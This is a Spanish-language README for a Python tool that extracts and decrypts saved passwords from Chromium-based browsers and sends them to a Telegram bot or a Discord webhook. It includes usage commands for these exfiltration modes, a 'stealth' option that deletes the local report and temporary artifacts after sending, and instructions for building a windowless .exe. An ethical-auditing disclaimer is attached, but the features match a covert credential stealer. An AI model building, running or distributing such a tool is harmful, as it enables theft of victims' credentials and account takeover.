# 🛡️ Chromium Credentials Auditor Suite

Una herramienta profesional y modular diseñada para la extracción, descifrado y exfiltración de credenciales almacenadas en navegadores basados en **Chromium**. Optimizada para auditorías de seguridad en entornos controlados y pentesting ético.

---

## ✨ Características Principales

*   **🌐 Soporte Multi-Navegador**: Extrae automáticamente credenciales de:
    *   Google Chrome
    *   Microsoft Edge
    *   Brave Browser
    *   Opera & Opera GX
    *   Vivaldi
*   **🔌 Exfiltración Modular**: Soporte nativo para:
    *   **Telegram**: Envío de reportes directamente a un bot.
    *   **Discord**: Integración con Webhooks.
*   **📊 Reportes Flexibles**:
    *   **HTML Premium**: Genera reportes interactivos y estéticos para el cliente final.
    *   **CSV Estándar**: Para análisis de datos crudos.
*   **🕵️ Modo Sigilo (Stealth)**:
    *   Limpieza automática de artefactos temporales.
    *   Borrado automático del reporte local tras una exfiltración exitosa (opcional).

---

## 🚀 Instalación y Uso

### 1. Clonar e Instalar Dependencias
```bash
git clone https://github.com/ANONIMO432HZ/decrypt-chromium-suite.git
cd decrypt-chromium-suite
pip install -r requirements.txt
```

### 2. Comandos de Uso

**Auditoría Local (Reporte HTML):**
```bash
python main.py -f html -o reporte_auditoria
```

**Auditoría con Exfiltración a Telegram:**
```bash
python main.py --telegram-token "TOKEN" --telegram-chatid "ID"
```

**Auditoría con Exfiltración a Discord y modo Verboso:**
```bash
python main.py --discord "WEBHOOK_URL" -v
```

---

## 📦 Compilación a Ejecutable (.exe)

Para ejecutar esta suite en entornos sin Python instalado, puedes compilarla en un único archivo portable:

1.  Instala PyInstaller:
    ```bash
    pip install pyinstaller
    ```
2.  Compila el proyecto:
    ```bash
    pyinstaller --onefile --noconsole main.py
    ```
3.  Busca tu ejecutable en la carpeta `dist/main.exe`.

---

## 🚦 Parámetros Disponibles

| Argumento | Descripción |
| :--- | :--- |
| `-f`, `--format` | Formato de salida: `html` (por defecto) o `csv`. |
| `-o`, `--output` | Nombre base del archivo de reporte. |
| `--telegram-token` | Token del bot de Telegram para exfiltración. |
| `--telegram-chatid` | ID del chat de Telegram para recibir el archivo. |
| `--discord` | URL del Webhook de Discord. |
| `--no-wipe` | Evita que el reporte se borre localmente tras enviarse por red. |
| `-v`, `--verbose` | Muestra logs detallados de captura en consola. |

---

## ⚖️ Descargo de Responsabilidad Ética

Esta herramienta ha sido desarrollada estrictamente para **fines educativos y de auditoría de seguridad profesional**. El autor no se hace responsable del uso indebido de esta herramienta. **Nunca utilices este software sin el consentimiento explícito del propietario del sistema.**

---
*Mantenido por el equipo de Auditoría Digital.*
